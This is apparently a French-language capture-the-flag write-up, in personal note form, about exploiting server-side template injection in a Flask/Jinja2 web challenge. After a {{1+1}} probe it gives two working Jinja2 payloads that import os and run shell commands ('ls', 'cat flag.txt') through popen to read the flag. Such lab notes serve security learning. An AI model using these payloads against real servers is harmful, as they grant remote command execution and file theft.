TAGS : #SSTI #WEB #FLAG
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
# Server-Side Template Injection
Impossible de fuzz, il y a une wildcard sur le nom qu'on entre
![[Pasted image 20240312134214.png]]

Techno utilisé : Flask

Test Jinja2: 
Si on recherche /test{{1+1}} : ![[Pasted image 20240312134332.png]]

On remarque la présence de **Jinja2** car notre recherche à retourner le résultat de 1+1.
Jinja2 est un moteur pour créer des pages web dynamiques en mélangeant HTML et Python, facilitant la personnalisation du contenu.

Pour obtenir le flag : 
Je regarde le contenu du dossier acutel : 
`/test {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
		![[Pasted image 20240312134742.png]]

`/test {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}`
		![[Pasted image 20240312134828.png]]